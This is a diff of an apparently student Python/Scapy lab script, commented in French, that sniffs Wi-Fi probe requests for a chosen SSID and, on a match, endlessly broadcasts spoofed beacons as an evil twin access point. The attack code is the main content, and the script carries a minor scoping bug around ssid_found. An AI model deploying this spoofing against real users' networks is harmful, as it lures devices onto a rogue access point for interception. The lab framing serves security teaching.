@@ -28,34 +28,39 @@ args = parser.parse_args()
 # Développer un script en Python/Scapy capable de detecter une STA cherchant un SSID particulier - proposer un evil twin si le SSID est trouvé (i.e. McDonalds, Starbucks, etc.).
 # Pour la détection du SSID, vous devez utiliser Scapy. Pour proposer un evil twin, vous pouvez très probablement réutiliser du code des exercices précédents ou vous servir d'un outil existant.
 
+ssid_found = False
 
 # Fonction appelée sur chaque paquet sniffé
 def pkt_handler(pkt):
-    # Si le paquet est une probe request
-    if pkt.haslayer(Dot11ProbeReq):
-        print("Probe request détectée !")
-        print("SSID : ", pkt.info.decode())
-        # Si le packet contient le SSID cible
-        if pkt.info.decode() == args.s:
-            print("Probe request pour le SSID cible détectée !")
-            print("SSID cible : ", pkt.info.decode())
-            # Attaque Evil Twin
-            print("Attaque Evil Twin en cours...")
-            evil_twin()
+    if pkt.haslayer(Dot11Elt):
+        #Check si c'est une probe request
+        if pkt.type == 0 and pkt.subtype == 4:
+            print(args.s)
+            print("Probe request détectée !")
+            print("SSID : ", pkt[Dot11Elt].info)
+            ssid = pkt[Dot11Elt].info
+            
+            if ssid.decode() == args.s:
+                ssid_found = True
+                evil_twin()
+            	
+            
+        
 
 # Fonction qui envoie un beacon avec le SSID cible
 def evil_twin():
     random_mac = Faker().mac_address()
     packet = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=random_mac, addr3=random_mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=args.s, len=len(args.s))
-    sendp(packet, iface=args.i, inter=0.1, loop=1)
-
-    sendp(packet, iface='wlan0mon', inter=0.1, verbose=1)
+    sendp(packet, iface=args.i, inter=0.1, loop=1, verbose=1)
 
 def main():
 
     # Snif les paquets pour détecter les AP
     print("Sniffing en cours...")
-    sniff(count = 10000, timeout=5, iface="wlan0mon", prn = pkt_handler)
+    sniff(timeout=30, iface=args.i, prn = pkt_handler)
+    if ssid_found == False:
+       print("Aucun SSID n'a été trouvé")
+    
 
     print("Fin du sniffing")
 
